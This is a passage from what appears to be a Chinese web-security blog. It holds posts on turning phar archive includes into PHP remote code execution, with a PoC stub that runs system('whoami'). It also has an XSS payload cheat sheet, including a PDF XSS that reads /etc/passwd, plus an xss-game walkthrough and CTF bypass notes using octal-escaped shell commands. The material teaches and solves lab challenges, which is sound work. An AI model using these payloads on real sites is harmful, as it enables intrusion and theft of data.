#ifndef MAX_WBITS #define MAX_WBITS 15 #endif add_assoc_long_ex(\u0026amp;filterparams, \u0026#34;window\u0026#34;, sizeof(\u0026#34;window\u0026#34;) - 1, MAX_WBITS + 32); /* entire file is gzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to create temporary file for decompression of gzipped phar archive \\\u0026#34;%s\\\u0026#34;\u0026#34;) } php_stream_rewind(fp); filter = php_stream_filter_create(\u0026#34;zlib.inflate\u0026#34;, \u0026amp;filterparams, php_stream_is_persistent(fp)); if (!filter) { err = 1; add_assoc_long_ex(\u0026amp;filterparams, \u0026#34;window\u0026#34;, sizeof(\u0026#34;window\u0026#34;) - 1, MAX_WBITS); filter = php_stream_filter_create(\u0026#34;zlib.inflate\u0026#34;, \u0026amp;filterparams, php_stream_is_persistent(fp)); zend_array_destroy(Z_ARR(filterparams)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress gzipped phar archive \\\u0026#34;%s\\\u0026#34;, ext/zlib is buggy in PHP versions older than 5.2.6\u0026#34;) } } else { zend_array_destroy(Z_ARR(filterparams)); } php_stream_filter_append(\u0026amp;temp-\u0026gt;writefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); if (err) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress gzipped phar archive \\\u0026#34;%s\\\u0026#34;, ext/zlib is buggy in PHP versions older than 5.2.6\u0026#34;) } php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress gzipped phar archive \\\u0026#34;%s\\\u0026#34; to temporary file\u0026#34;) } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_GZ; /* now, start over */ test = \u0026#39;\\0\u0026#39;; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress gzipped phar archive \\\u0026#34;%s\\\u0026#34;\u0026#34;); break; } continue; } else if (!memcmp(pos, bz_magic, 3)) { php_stream_filter *filter; php_stream *temp; if (!PHAR_G(has_bz2)) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress bzipped phar archive \\\u0026#34;%s\\\u0026#34; to temporary file, enable bz2 extension in php.ini\u0026#34;) } /* entire file is bzip-compressed, uncompress to temporary file */ if (!(temp = php_stream_fopen_tmpfile())) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to create temporary file for decompression of bzipped phar archive \\\u0026#34;%s\\\u0026#34;\u0026#34;) } php_stream_rewind(fp); filter = php_stream_filter_create(\u0026#34;bzip2.decompress\u0026#34;, NULL, php_stream_is_persistent(fp)); if (!filter) { php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress bzipped phar archive \\\u0026#34;%s\\\u0026#34;, filter creation failed\u0026#34;) } php_stream_filter_append(\u0026amp;temp-\u0026gt;writefilters, filter); if (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, NULL)) { php_stream_filter_remove(filter, 1); php_stream_close(temp); MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress bzipped phar archive \\\u0026#34;%s\\\u0026#34; to temporary file\u0026#34;) } php_stream_filter_flush(filter, 1); php_stream_filter_remove(filter, 1); php_stream_close(fp); fp = temp; php_stream_rewind(fp); compression = PHAR_FILE_COMPRESSED_BZ2; /* now, start over */ test = \u0026#39;\\0\u0026#39;; if (!--recursion_count) { MAPPHAR_ALLOC_FAIL(\u0026#34;unable to decompress bzipped phar archive \\\u0026#34;%s\\\u0026#34;\u0026#34;); break; } continue; } if (!memcmp(pos, zip_magic, 4)) { php_stream_seek(fp, 0, SEEK_END); return phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error); } if (got \u0026gt;= 512) { if (phar_is_tar(pos, fname)) { php_stream_rewind(fp); return phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, is_data, compression, error); } } } if (got \u0026gt; 0 \u0026amp;\u0026amp; (pos = phar_strnstr(buffer, got + sizeof(token), token, sizeof(token)-1)) != NULL) { halt_offset += (pos - buffer); /* no -tokenlen+tokenlen here */ return phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error); } halt_offset += got; memmove(buffer, buffer + window_size, tokenlen); /* move the memory buffer by the size of the window */ } MAPPHAR_ALLOC_FAIL(\u0026#34;internal corruption of phar \\\u0026#34;%s\\\u0026#34; (__HALT_COMPILER(); not found)\u0026#34;) } /* }}} */ 简单来说这个函数负责打开一个可能是 PHAR 的文件流，根据文件头来识别它的格式（PHAR、ZIP、TAR、GZ、BZ2），并进行相应的解压和解析，比如文件格式是GZ，就会先进行解压获取其中的phar文件，再进行解析\n利用phar压缩包实现RCE 根据这个特性，可以实现上传不包含php代码的文件实现RCE，一个简单的poc：\n\u0026lt;?php $phar = new Phar(\u0026#39;exploit.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $stub = \u0026lt;\u0026lt;\u0026lt;\u0026#39;STUB\u0026#39; \u0026lt;?php system(\u0026#39;whoami\u0026#39;); __HALT_COMPILER(); ?\u0026gt; STUB; $phar-\u0026gt;setStub($stub); $phar-\u0026gt;addFromString(\u0026#39;test.txt\u0026#39;, \u0026#39;test\u0026#39;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; tar和phar都有php明文代码，没必要专门打包一个tar文件，所以选择直接include这个phar文件或压缩文件都可以实现RCE，利用了.phar文件名实现了解压：\ninclude(\u0026#34;exploit.phar.gz\u0026#34;); // gzip exploit.phar include(\u0026#34;exploit.phar.bz2\u0026#34;); // bzip2 exploit.phar 比较奇怪为什么zip没有成功，只能用伪协议，当然gz和bzip2也能用伪协议：\ninclude(\u0026#34;zip://exploit.phar.zip#exploit.phar\u0026#34;); include(\u0026#34;compress.zlib://exploit.phar.gz\u0026#34;); include(\u0026#34;compress.bzip2://exploit.phar.bz2\u0026#34;); 之前也提到是根据文件头来识别压缩文件的，所以说即使后缀不为.gz .bz2也是可以实现解压的，可以用于绕过后缀名的检验，只要文件是相应压缩包格式即可\n参考资料：\nhttps://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/\n","permalink":"https://blog.w8nn9z.top/posts/web/pharinclude/","summary":"","title":"Phar Include RCE"},{"content":"XSS分类 反射型XSS DOM型XSS 存储型XSS html标签中嵌入js a 标签 创建超链接，需要通过触发事件来触发xss，比如点击、鼠标悬停等：\n\u0026lt;a href=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a/href=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt;test \u0026lt;a href=x onfocus=\u0026#34;alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;x\u0026#34; onclick=eval(\u0026#34;alert(\u0026#39;XSS\u0026#39;);\u0026#34;)\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;x\u0026#34; onmouseover=\u0026#34;alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a href=x onmouseout=\u0026#34;alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; img 标签 通过onerror来触发xss\n\u0026lt;img src=x onerror=\u0026#34;alert(1)\u0026#34;\u0026gt; iframe 标签 \u0026lt;iframe src=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;test\u0026lt;/iframe\u0026gt; \u0026lt;iframe onload=\u0026#34;alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;iframe/src=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\u0026#34;\u0026gt; Edge/Chrome audio 标签 \u0026lt;audio src=1 onerror=alert(1)\u0026gt; video 标签 svg 标签 button 标签 details 标签 需要展开详细信息：\nbody 标签 bypass 空格绕过 斜杠 / 绕过空格：\n\u0026lt;img/src=\u0026#34;x\u0026#34;/onerror=alert(1)\u0026gt; \u0026lt;img/src=x onerror=alert(1)\u0026gt; 括号绕过 反引号绕过括号：\n\u0026lt;script\u0026gt;alert`1`\u0026lt;/script\u0026gt; unicode编码 无法编码操作符和标点符号，比如括号：\n\u0026lt;script\u0026gt;\\u0061lert(1)\u0026lt;/script\u0026gt; html编码 \u0026lt;a href=\u0026#34;\u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#49;\u0026amp;#41;\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;\u0026amp;#x3a;\u0026amp;#x61;\u0026amp;#x6c;\u0026amp;#x65;\u0026amp;#x72;\u0026amp;#x74;\u0026amp;#x28;\u0026amp;#x31;\u0026amp;#x29;\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;\u0026amp;#x6a\u0026amp;#x61\u0026amp;#x76\u0026amp;#x61\u0026amp;#x73\u0026amp;#x63\u0026amp;#x72\u0026amp;#x69\u0026amp;#x70\u0026amp;#x74\u0026amp;#x3a\u0026amp;#x61\u0026amp;#x6c\u0026amp;#x65\u0026amp;#x72\u0026amp;#x74\u0026amp;#x28\u0026amp;#x31\u0026amp;#x29\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; url编码 在src/href处使用，html会处理 javascript 后的url编码：\n\u0026lt;iframe src=\u0026#34;javascript:%61%6c%65%72%74%28%31%29\u0026#34;\u0026gt;test\u0026lt;/iframe\u0026gt; Edge/Chrome \u0026lt;a href=\u0026#34;javascript:%61%6c%65%72%74%28%31%29\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; xss利用场景 pdf xss \u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026#39;GET\u0026#39;,\u0026#39;file:///etc/passwd\u0026#39;);x.send();\u0026lt;/script\u0026gt; https://xss-game.appspot.com/ 上的6个xss挑战 Level 1: Hello, world of XSS 网页源码：\npage_header = \u0026#34;\u0026#34;\u0026#34; \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level1\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level1.png\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026#34;\u0026#34;\u0026#34; page_footer = \u0026#34;\u0026#34;\u0026#34; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; main_page_markup = \u0026#34;\u0026#34;\u0026#34; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;query\u0026#34; name=\u0026#34;query\u0026#34; value=\u0026#34;Enter query here...\u0026#34; onfocus=\u0026#34;this.value=\u0026#39;\u0026#39;\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;button\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Search\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#34;\u0026#34;\u0026#34; class MainPage(webapp.RequestHandler): def render_string(self, s): self.response.out.write(s) def get(self): # Disable the reflected XSS filter for demonstration purposes self.response.headers.add_header(\u0026#34;X-XSS-Protection\u0026#34;, \u0026#34;0\u0026#34;) if not self.request.get(\u0026#39;query\u0026#39;): # Show main search page self.render_string(page_header + main_page_markup + page_footer) else: query = self.request.get(\u0026#39;query\u0026#39;, \u0026#39;[empty]\u0026#39;) # Our search engine broke, we found no results :-( message = \u0026#34;Sorry, no results were found for \u0026lt;b\u0026gt;\u0026#34; + query + \u0026#34;\u0026lt;/b\u0026gt;.\u0026#34; message += \u0026#34; \u0026lt;a href=\u0026#39;?\u0026#39;\u0026gt;Try again\u0026lt;/a\u0026gt;.\u0026#34; # Display the results page self.render_string(page_header + message + page_footer) return application = webapp.WSGIApplication([ (\u0026#39;.*\u0026#39;, MainPage), ], debug=False) 默认搜索引擎损坏，根据query的传参值，返回message。目标是利用XSS弹出弹框，只需将前后的标签\u0026lt;b\u0026gt;闭合即可：\n?query=\u0026lt;/b\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;b\u0026gt; 这样嵌入页面的代码就是：\npage_header + \u0026#34;Sorry, no results were found for \u0026lt;b\u0026gt;\u0026lt;/b\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;b\u0026gt;\u0026lt;/b\u0026gt;. \u0026lt;a href=\u0026#39;?\u0026#39;\u0026gt;Try again\u0026lt;/a\u0026gt;.\u0026#34; + page_footer Level 2: Persistence is key index.html中比较关键的是这段函数的定义：\nfunction displayPosts() { var containerEl = document.getElementById(\u0026#34;post-container\u0026#34;); containerEl.innerHTML = \u0026#34;\u0026#34;; var posts = DB.getPosts(); for (var i=0; i\u0026lt;posts.length; i++) { var html = \u0026#39;\u0026lt;table class=\u0026#34;message\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td valign=top\u0026gt; \u0026#39; + \u0026#39;\u0026lt;img src=\u0026#34;/static/level2_icon.png\u0026#34;\u0026gt; \u0026lt;/td\u0026gt; \u0026lt;td valign=top \u0026#39; + \u0026#39; class=\u0026#34;message-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;shim\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;; html += \u0026#39;\u0026lt;b\u0026gt;You\u0026lt;/b\u0026gt;\u0026#39;; html += \u0026#39;\u0026lt;span class=\u0026#34;date\u0026#34;\u0026gt;\u0026#39; + new Date(posts[i].date) + \u0026#39;\u0026lt;/span\u0026gt;\u0026#39;; html += \u0026#34;\u0026lt;blockquote\u0026gt;\u0026#34; + posts[i].message + \u0026#34;\u0026lt;/blockquote\u0026#34;; html += \u0026#34;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;/table\u0026gt;\u0026#34; containerEl.innerHTML += html; } } window.onload = function() { document.getElementById(\u0026#39;clear-form\u0026#39;).onsubmit = function() { DB.clear(function() { displayPosts() }); return false; } document.getElementById(\u0026#39;post-form\u0026#39;).onsubmit = function() { var message = document.getElementById(\u0026#39;post-content\u0026#39;).value; DB.save(message, function() { displayPosts() } ); document.getElementById(\u0026#39;post-content\u0026#39;).value = \u0026#34;\u0026#34;; return false; } displayPosts(); } 简单来说，就是将输入框中用户输入的内容通过innerHTML动态加载到页面，查阅innerHTML的文档可知，HTML 5 中指定不执行由 innerHTML 插入的\u0026lt;script\u0026gt;标签，因此本题无法简单地利用\u0026lt;script\u0026gt;alert('XSS')\u0026lt;/script\u0026gt;来实现XSS\n文档中介绍了一条不依赖script标签来执行JavaScript的方法，光用innerHTML是无法避免XSS攻击的：\n\u0026lt;/blockquote\u0026gt;\u0026lt;img src=\u0026#39;x\u0026#39; onerror=\u0026#34;alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt;\u0026lt;blockquote\u0026gt; 文档中也给出了安全建议，使用Node.textContent，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置\nLevel 3: That sinking feeling\u0026hellip; index.html：\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;!-- Load jQuery --\u0026gt; \u0026lt;script src=\u0026#34;//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; function chooseTab(num) { // Dynamically load the appropriate image. var html = \u0026#34;Image \u0026#34; + parseInt(num) + \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; html += \u0026#34;\u0026lt;img src=\u0026#39;/static/level3/cloud\u0026#34; + num + \u0026#34;.jpg\u0026#39; /\u0026gt;\u0026#34;; $(\u0026#39;#tabContent\u0026#39;).html(html); window.location.hash = num; // Select the current tab var tabs = document.querySelectorAll(\u0026#39;.tab\u0026#39;); for (var i = 0; i \u0026lt; tabs.length; i++) { if (tabs[i].id == \u0026#34;tab\u0026#34; + parseInt(num)) { tabs[i].className = \u0026#34;tab active\u0026#34;; } else { tabs[i].className = \u0026#34;tab\u0026#34;; } } // Tell parent we\u0026#39;ve changed the tab top.postMessage(self.location.toString(), \u0026#34;*\u0026#34;); } window.onload = function() { chooseTab(unescape(self.location.hash.substr(1)) || \u0026#34;1\u0026#34;); } // Extra code so that we can communicate with the parent page window.addEventListener(\u0026#34;message\u0026#34;, function(event){ if (event.source == parent) { chooseTab(unescape(self.location.hash.substr(1))); } }, false); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level3\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;img id=\u0026#34;logo\u0026#34; src=\u0026#34;/static/logos/level3.png\u0026#34;\u0026gt; \u0026lt;span\u0026gt;Take a tour of our cloud data center.\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tab\u0026#34; id=\u0026#34;tab1\u0026#34; onclick=\u0026#34;chooseTab(\u0026#39;1\u0026#39;)\u0026#34;\u0026gt;Image 1\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tab\u0026#34; id=\u0026#34;tab2\u0026#34; onclick=\u0026#34;chooseTab(\u0026#39;2\u0026#39;)\u0026#34;\u0026gt;Image 2\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tab\u0026#34; id=\u0026#34;tab3\u0026#34; onclick=\u0026#34;chooseTab(\u0026#39;3\u0026#39;)\u0026#34;\u0026gt;Image 3\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;tabContent\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 每次加载页面都会触发onload，截取url中从#开始的字符串，如果没有则直接执行chooseTab(\u0026ldquo;1\u0026rdquo;)，根据location.hash的属性值向id=\u0026ldquo;tabContent\u0026quot;动态插入html代码，实现页面的切换和图片的显示\n观察到并未对location.hash进行限制，且该值可控，直接利用script标签即可实现XSS：\n1.jpg\u0026#39; /\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;!-- 也可以使用onerror来实现，但是无法加载图片：\n1\u0026#39; onerror=\u0026#34;alert(\u0026#39;XSS\u0026#39;)\u0026#34; x= Level 4: Context matters timer.html：\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; function startTimer(seconds) { seconds = parseInt(seconds) || 3; setTimeout(function() { window.confirm(\u0026#34;Time is up!\u0026#34;); window.history.back(); }, seconds * 1000); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level4\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level4.png\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;img src=\u0026#34;/static/loading.gif\u0026#34; onload=\u0026#34;startTimer(\u0026#39;{{ timer }}\u0026#39;);\u0026#34; /\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;Your timer will execute in {{ timer }} seconds.\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; timer经level.py中template.render渲染，会对恶意的XSS语句进行转义，例如传入\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;：\n\u0026lt;div id=\u0026#34;message\u0026#34;\u0026gt;Your timer will execute in \u0026amp;lt;script\u0026amp;gt;alert(1)\u0026amp;lt;/script\u0026amp;gt; seconds.\u0026lt;/div\u0026gt; 所以只能考虑从第一个timer进行利用，在传入\u0026lt;script\u0026gt;alert('XSS')\u0026lt;/script\u0026gt;时发现根本无法触发startTimer，未出现confirm的弹窗，考虑是传参可能出了问题。\n查看Hint2，发现浏览器在解析标签attributes属性值时，会先进行HTML-decode，因此即使tempate.render对特殊符号进行了编码，在解析onload属性中的timer时仍然会以原字符的形式解析，所以传入单引号时无法触发函数\n知道这个特性后，只需闭合左边的'(再调用alert即可实现XSS：\n5\u0026#39;);alert(\u0026#39;XSS Level 5: Breaking protocol level.py：\nclass MainPage(webapp.RequestHandler): def render_template(self, filename, context={}): path = os.path.join(os.path.dirname(__file__), filename) self.response.out.write(template.render(path, context)) def get(self): # Disable the reflected XSS filter for demonstration purposes self.response.headers.add_header(\u0026#34;X-XSS-Protection\u0026#34;, \u0026#34;0\u0026#34;) # Route the request to the appropriate template if \u0026#34;signup\u0026#34; in self.request.path: self.render_template(\u0026#39;signup.html\u0026#39;, {\u0026#39;next\u0026#39;: self.request.get(\u0026#39;next\u0026#39;)}) elif \u0026#34;confirm\u0026#34; in self.request.path: self.render_template(\u0026#39;confirm.html\u0026#39;, {\u0026#39;next\u0026#39;: self.request.get(\u0026#39;next\u0026#39;, \u0026#39;welcome\u0026#39;)}) else: self.render_template(\u0026#39;welcome.html\u0026#39;, {}) return application = webapp.WSGIApplication([ (\u0026#39;.*\u0026#39;, MainPage), ], debug=False) welcome.html：\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level5\u0026#34;\u0026gt; Welcome! Today we are announcing the much anticipated\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level5.png\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;/level5/frame/signup?next=confirm\u0026#34;\u0026gt;Sign up\u0026lt;/a\u0026gt; for an exclusive Beta. \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; signup.html：\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level5\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level5.png\u0026#34; /\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;!-- We\u0026#39;re ignoring the email, but the poor user will never know! --\u0026gt; Enter email: \u0026lt;input id=\u0026#34;reader-email\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;{{ next }}\u0026#34;\u0026gt;Next \u0026gt;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; next值可控，将href属性值设为javascript代码段即可实现XSS：\njavascript:alert(\u0026#39;XSS\u0026#39;); Level 6: Follow the 🐇 index.html：\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- Internal game scripts/styles, mostly boring stuff --\u0026gt; \u0026lt;script src=\u0026#34;/static/game-frame.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/game-frame-styles.css\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; function setInnerText(element, value) { if (element.innerText) { element.innerText = value; } else { element.textContent = value; } } function includeGadget(url) { var scriptEl = document.createElement(\u0026#39;script\u0026#39;); // This will totally prevent us from loading evil URLs! if (url.match(/^https?:\\/\\//)) { setInnerText(document.getElementById(\u0026#34;log\u0026#34;), \u0026#34;Sorry, cannot load a URL containing \\\u0026#34;http\\\u0026#34;.\u0026#34;); return; } // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() { setInnerText(document.getElementById(\u0026#34;log\u0026#34;), \u0026#34;Loaded gadget from \u0026#34; + url); } scriptEl.onerror = function() { setInnerText(document.getElementById(\u0026#34;log\u0026#34;), \u0026#34;Couldn\u0026#39;t load gadget from \u0026#34; + url); } document.head.appendChild(scriptEl); } // Take the value after # and use it as the gadget filename. function getGadgetName() { return window.location.hash.substr(1) || \u0026#34;/static/gadget.js\u0026#34;; } includeGadget(getGadgetName()); // Extra code so that we can communicate with the parent page window.addEventListener(\u0026#34;message\u0026#34;, function(event){ if (event.source == parent) { includeGadget(getGadgetName()); } }, false); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body id=\u0026#34;level6\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;/static/logos/level6.png\u0026#34;\u0026gt; \u0026lt;img id=\u0026#34;cube\u0026#34; src=\u0026#34;/static/level6_cube.png\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;log\u0026#34;\u0026gt;Loading gadget...\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 实现了一个从外部加载js代码并添加到head的功能，要求location.hash中不包含\u0026quot;http\u0026quot;字符串，可以使用data协议：\nhttps://xss-game.appspot.com/level6/frame#data:,alert(\u0026#39;XSS\u0026#39;); ","permalink":"https://blog.w8nn9z.top/posts/web/xss/","summary":"","title":"XSS"},{"content":" 积累并记录一些bypass\nmd5 0e绕过，注意0e后必须全是数字，否则仍会被当作字符串进行比较：\n可以自行爆破来找符合条件的\n两次md5后是0e开头：\niv2Cn\rf2WfQ 一次md5后是0e开头：\n240610708 空格绕过 对于执行shell命令的环境往往会过滤空格，但是由于shell本身的特性，导致出现一些bypass，如$IFS等，常见绕过原理如下： $IFS是shell中的字段分隔符，默认值为 空格、Tab、换行\nphp反引号+八进制\\dxxx实现RCE Simple Calculator [L3akCTF 2024]\n题目给了index.php的源码：\n\u0026lt;?php function popCalc() { if (isset($_GET[\u0026#39;formula\u0026#39;])) { $formula = $_GET[\u0026#39;formula\u0026#39;]; if (strlen($formula) \u0026gt;= 150 || preg_match(\u0026#39;/[a-z\\\u0026#39;\u0026#34;]+/i\u0026#39;, $formula)) { return \u0026#39;Try Harder !\u0026#39;; } try { eval(\u0026#39;$calc = \u0026#39; . $formula . \u0026#39;;\u0026#39;); return isset($calc) ? $calc : \u0026#39;?\u0026#39;; } catch (ParseError $err) { return \u0026#39;Error\u0026#39;; } } } $result = popCalc(); echo \u0026#34;Result: \u0026#34; . $result; ?\u0026gt; $formula是个可控的变量，不允许长度超过150，同时字符串中不能出现字母和大小写引号\n本题的bypass运用到了如下的两个特性：\n1.PHP中反引号中的内容会被作为shell 命令来执行，并将其输出信息返回\n2.PHP中\\ddd表示的是1~3位八进制ASCII值对应字符\nls对应payload为?formula=`\\154\\163`\rResult: flag-YQUO4fGlBZhRt3qZAg9Xnneyunqm5kmiP6CvM2JafYJ9alzgOTWYp3lNxTsaZlhd.txt\rindex.php\rcat f*对应payload为?formula=`\\143\\141\\164\\40\\146\\52`\rResult: L3AK{PhP_Web_Ch@ll3ng3} true在弱比较时的特性 除了空对象以外，目前只发现0值以及其他类型空值与true进行弱比较会判断为false：\n\u0026lt;?php $emptyArr = array(); $emptystr = \u0026#34;\u0026#34;; if (true == 0 || true == null || true == $emptyArr 